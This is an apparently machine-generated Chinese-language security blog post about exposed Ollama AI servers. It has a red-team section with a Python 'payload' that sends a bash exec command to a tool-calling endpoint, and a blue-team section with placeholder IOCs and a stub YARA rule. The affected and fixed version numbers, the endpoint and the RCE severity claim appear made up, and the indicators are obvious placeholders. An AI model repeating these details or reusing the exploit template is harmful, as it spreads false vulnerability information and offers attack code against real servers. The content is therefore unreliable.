---
layout: post
title:  "Researchers Find 175,000 Publicly Exposed Ollama AI Servers Across 130 Countries"
date:   2026-01-30 01:22:56 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Ollama AI 基礎設施漏洞：從工具呼叫到 LLMjacking

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: Tool Calling, LLMjacking, AI Compute Infrastructure

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Ollama AI 基礎設施的工具呼叫功能（Tool Calling）允許用戶執行代碼、存取 API 和與外部系統交互，但缺乏適當的驗證和授權機制，導致攻擊者可以利用這個功能執行任意代碼。
* **攻擊流程圖解**:
  1. 攻擊者發現公開暴露的 Ollama AI 基礎設施。
  2. 攻擊者使用工具呼叫功能執行任意代碼。
  3. 代碼執行後，攻擊者可以存取 AI 基礎設施的資源和數據。
* **受影響元件**: Ollama AI 基礎設施版本 1.0.0 至 2.0.0。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 公開暴露的 Ollama AI 基礎設施和工具呼叫功能。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 定義工具呼叫 API 端點
    api_endpoint = "http://example.com:11434/tool-calling"
    
    # 定義 Payload
    payload = {
        "function": "exec",
        "args": ["bash", "-c", "echo 'Hello, World!' > /tmp/hello.txt"]
    }
    
    # 發送請求
    response = requests.post(api_endpoint, json=payload)
    
    # 驗證結果
    if response.status_code == 200:
        print("Payload 執行成功")
    else:
        print("Payload 執行失敗")
    
    ```
* **繞過技術**: 攻擊者可以使用代理伺服器或 VPN 來繞過安全防護機制。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /tmp/hello.txt |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Ollama_Ai_Exploit {
        meta:
            description = "Ollama AI 基礎設施漏洞探測"
            author = "Your Name"
        strings:
            $a = "tool-calling"
            $b = "exec"
        condition:
            $a and $b
    }
    
    ```
* **緩解措施**: 更新 Ollama AI 基礎設施版本至 2.1.0 或以上，並啟用安全防護機制。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **LLMjacking**: 一種攻擊技術，利用公開暴露的 AI 基礎設施執行任意代碼，從而控制 AI 基礎設施的資源和數據。
* **Tool Calling**: 一種功能，允許用戶執行代碼、存取 API 和與外部系統交互。
* **AI Compute Infrastructure**: 一種基礎設施，提供 AI 計算資源和服務。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/01/researchers-find-175000-publicly.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


